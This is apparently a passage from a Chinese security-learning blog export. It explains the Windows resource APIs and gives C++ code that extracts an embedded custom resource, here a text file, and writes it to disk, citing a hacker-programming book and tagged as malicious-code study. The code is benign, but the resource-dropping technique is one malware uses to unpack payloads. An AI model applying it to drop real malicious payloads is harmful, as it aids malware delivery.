hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。 hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。 返回值：如果函数运行成功，则返回值为资源的字节数；如果函数运行失败，则返回值为0； LoadResource函数：装载指定资源到全局存储器1234HGLOBAL LoadResource( HMODULE hModule, HRSRC hResInfo); hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。 hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。 返回值：如果函数运行成功，则返回值为相关资源数据的句柄。如果函数运行失败，则返回值为NULL。 LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针123LPVOID LockResource( HGLOBAL hResData); hResData：装载资源的句柄。函数LoadResource可以返回这个句柄。 返回值：如果装载资源被锁住，则返回值是资源的第一个字节的指针；反之则为NULL。 实现过程创建一个test.txt文件，写入内容 在程序中添加一个自定义资源，自定义资源名称为“MYRES”，再将刚才创建的txt文件添加进去 程序实现源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// FreeRes.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;//资源控件名称，资源名称，释放后的名称BOOL FreeRes(UINT uiResourceName,TCHAR* lpszResType,char* lpszSaveFileName) &#123; //获取指定模块的资源 HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(uiResourceName), lpszResType); if (hRes == NULL) &#123; MessageBox(NULL, L&quot;获取资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //获取大小 DWORD dwSize = SizeofResource(NULL, hRes); if (dwSize == 0) &#123; MessageBox(NULL, L&quot;获取字节数失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //装载资源 HGLOBAL hGlobal = LoadResource(NULL, hRes); if (hGlobal == NULL) &#123; MessageBox(NULL, L&quot;装载资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //锁定资源 LPVOID lPvoid = LockResource(hGlobal); if(lPvoid == NULL)&#123; MessageBox(NULL, L&quot;锁定资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //开始释放资源 FILE* fp; fopen_s(&amp;fp, lpszSaveFileName, &quot;wb+&quot;);//wb+读写打开或建立一个二进制文件，允许读和写 if (fp == NULL) &#123; MessageBox(NULL, L&quot;写入资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; fwrite(lPvoid, sizeof(char), dwSize, fp); fclose(fp); return TRUE;&#125;int main()&#123; printf(&quot;按下回车键开始释放资源\\n&quot;); getchar(); BOOL FLAG=FreeRes(IDR_MYRES2,TEXT(&quot;MYRES&quot;),&quot;free.txt&quot;); if (FLAG == TRUE) &#123; printf(&quot;释放成功\\n&quot;); &#125; else printf(&quot;释放失败\\n&quot;); getchar();&#125; 查看free.txt内容 参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}]},{"title":"写在前面的话","slug":"写在前面的话","date":"2021-07-08T03:50:10.000Z","updated":"2021-07-08T09:40:20.968Z","comments":true,"path":"2021/07/08/写在前面的话/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/","excerpt":"","text":"一直都在说要写博客，但是一直都没有很好的坚持下来，上次写博客还是大二的时候，这都过去好久了。 现在自己也搭建了一个博客，希望能够好好坚持下去吧，作为日常的学习记录，也希望能够写出一些有价值的东西。 最后的最后，我是不知名小团队satter的b1ackie。","categories":[],"tags":[]}],"categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"PE","slug":"PE","permalink":"https://b1ack1e.github.io/tags/PE/"},{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]}